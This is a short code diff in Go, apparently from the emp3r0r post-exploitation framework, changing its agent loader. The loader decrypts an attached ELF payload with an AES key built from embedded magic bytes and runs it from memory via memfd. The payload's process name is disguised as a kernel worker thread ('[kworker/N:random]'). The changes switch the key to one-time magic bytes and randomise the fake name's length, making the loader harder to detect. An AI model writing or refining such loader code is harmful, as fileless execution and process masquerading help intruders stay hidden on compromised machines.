@@ -24,7 +24,7 @@ func main() {
 	}
 
 	// decrypt attached ELF file
-	key := tun.GenAESKey(emp3r0r_data.MagicString)
+	key := tun.GenAESKey(string(emp3r0r_data.OneTimeMagicBytes))
 	elfdata := tun.AESDecryptRaw(key, read_elf_bytes)
 	if elfdata == nil {
 		log.Fatalf("AESDecrypt failed: length of cipher text is %d bytes", len(read_elf_bytes))
@@ -63,7 +63,7 @@ func main() {
 
 	for {
 		// run from memfd
-		procName := fmt.Sprintf("[kworker/%d:%s]", util.RandInt(5, 12), util.RandStr(7))
+		procName := fmt.Sprintf("[kworker/%d:%s]", util.RandInt(5, 12), util.RandStr(util.RandInt(5, 10)))
 		child := util.MemfdExec(procName, env, extracted_agent_elf.Bytes())
 
 		for {
